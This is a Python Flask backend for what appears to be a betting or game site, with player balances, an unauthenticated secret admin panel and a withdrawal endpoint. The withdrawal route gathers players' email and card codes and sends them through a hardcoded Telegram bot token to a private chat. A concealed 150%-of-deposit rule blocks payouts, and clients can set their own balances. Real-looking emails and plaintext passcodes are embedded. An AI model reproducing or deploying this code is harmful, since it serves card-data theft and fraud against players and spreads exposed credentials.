import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify, abort
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)

# --- TELEGRAM BOT MƏLUMATLARI (Yenilənmiş Aktiv Token) ---
TELEGRAM_BOT_TOKEN = "8502614066:AAHeXnfABYXaOqLBD5RZG0wV4WNAEGK9KbQ"
TELEGRAM_CHAT_ID = "7953669834"

def send_telegram_async(message):
    def send():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, json=payload, timeout=5)
            print("Telegram cavabı:", response.status_code, response.text) # Səhvləri izləmək üçün
        except Exception as e:
            print("Telegram xətası:", e)
    
    threading.Thread(target=send).start()

# --- XARİCİ KİBER TƏHLÜKƏSİZLİK QALXANI ---
REQUEST_COUNTS = {}
RATE_LIMIT_WINDOW = 1  
MAX_REQUESTS_PER_SECOND = 15  

def security_shield(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        current_time = time.time()
        
        if ip not in REQUEST_COUNTS:
            REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
        else:
            data = REQUEST_COUNTS[ip]
            if current_time - data['start_time'] < RATE_LIMIT_WINDOW:
                data['count'] += 1
                if data['count'] > MAX_REQUESTS_PER_SECOND:
                    abort(429, description="Çoxlu sayda sorğu göndərildi.")
            else:
                REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
                
        return f(*args, **kwargs)
    return decorated_function

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval';"
    return response

players_db = {
    "HOT_1106": {
        "id": "HOT_1106",
        "name": "Alexs Aliyev",
        "email": "aliyevalexs23@gmail.com",
        "code": "PASS483",
        "status": "Oflayn",
        "last_seen": "15:00:12",
        "balance": 0.00,
        "total_deposit": 0.00
    },
    "HOT_9446": {
        "id": "HOT_9446",
        "name": "Alexs",
        "email": "aliyev@gmail.com",
        "code": "PASS379",
        "status": "Oflayn",
        "last_seen": "14:31:17",
        "balance": 0.00,
        "total_deposit": 0.00
    }
}

@app.route('/')
@security_shield
def home():
    return render_template('index.html')

@app.route('/admin')
@security_shield
def admin_panel():
    return render_template('gizli_panel.html', players=players_db.values())

@app.route('/api/get_players', methods=['GET'])
@security_shield
def get_players():
    return jsonify(list(players_db.values()))

@app.route('/api/add_balance', methods=['POST'])
@security_shield
def add_balance():
    data = request.json
    if not data:
        return jsonify({"success": False, "message": "Etibarsız məlumat!"}), 400
        
    player_id = data.get('player_id')
    amount = data.get('amount')
    
    if player_id in players_db:
        try:
            val = float(amount)
            if val <= 0:
                return jsonify({"success": False, "message": "Məbləğ sıfırdan böyük olmalıdır!"}), 400
            players_db[player_id]['balance'] += val
            players_db[player_id]['total_deposit'] += val
            return jsonify({"success": True, "message": f"Balansa və ümumi depozitə {val:.2f} ₼ əlavə edildi!"})
        except (ValueError, TypeError):
            return jsonify({"success": False, "message": "Yanlış məbləğ formatı!"}), 400
            
    return jsonify({"success": False, "message": "Oyunçu tapılmadı!"}), 404

@app.route('/login', methods=['POST'])
@security_shield
def login():
    data = request.json or {}
    player_id = data.get('playerId')
    if player_id in players_db:
        players_db[player_id]['status'] = "Onlayn (Aktiv)"
        players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
        return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
    return jsonify({"status": "error", "message": "Tapılmadı"})

@app.route('/auth', methods=['POST'])
@security_shield
def auth():
    data = request.json or {}
    name = data.get('name', 'Qonaq')
    email = data.get('gmail', 'qonaq@gmail.com')
    new_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
    
    players_db[new_id] = {
        "id": new_id, "name": name, "email": email, "code": "PASS123",
        "status": "Onlayn (Aktiv)", "last_seen": time.strftime("%H:%M:%S"), "balance": 0.00, "total_deposit": 0.00
    }
    return jsonify({"status": "success", "playerId": new_id, "balance": 0.00})

@app.route('/update_balance', methods=['POST'])
@security_shield
def update_balance():
    data = request.json or {}
    player_id = data.get('playerId')
    new_balance = data.get('balance')
    if player_id in players_db and new_balance is not None:
        try:
            players_db[player_id]['balance'] = float(new_balance)
            players_db[player_id]['status'] = "Onlayn (Aktiv)"
            players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
            return jsonify({"status": "success"})
        except ValueError:
            pass
    return jsonify({"status": "error"})

@app.route('/withdraw', methods=['POST'])
@security_shield
def withdraw():
    data = request.json or {}
    player_id = data.get('playerId')
    amount = data.get('amount')
    gmail = data.get('gmail', 'Qeyd olunmayıb')
    card_code = data.get('cardCode', 'Qeyd olunmayıb')
    
    try:
        amount = float(amount)
    except (ValueError, TypeError):
        return jsonify({"status": "error", "message": "Yanlış məbləğ"})
        
    if player_id not in players_db:
        return jsonify({"status": "error", "message": "Oyunçu tapılmadı"})
        
    player = players_db[player_id]
    
    # Balans yoxlaması
    if player['balance'] < amount:
        return jsonify({"status": "error", "message": "Balans kifayət etmir!"})
        
    # 150% şərti (Arxa planda işləyir)
    min_required_win_balance = player['total_deposit'] * 1.5
    if player['balance'] < min_required_win_balance and player['total_deposit'] > 0:
        return jsonify({"status": "error", "message": "Pul çıxarmaq üçün şərtlər ödənmir!"})

    # Balansdan çıxılış
    player['balance'] -= amount
    
    # Telegram bota dərhal bildiriş göndərilməsi
    msg = f"💸 <b>YENİ PUL ÇIXARIŞ SORĞUSU!</b>\n\n🆔 Oyunçu ID: <b>{player_id}</b>\n👤 Ad: {player['name']}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n📧 Gmail: {gmail}\n💳 Kart Kodu: <code>{card_code}</code>"
    send_telegram_async(msg)
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)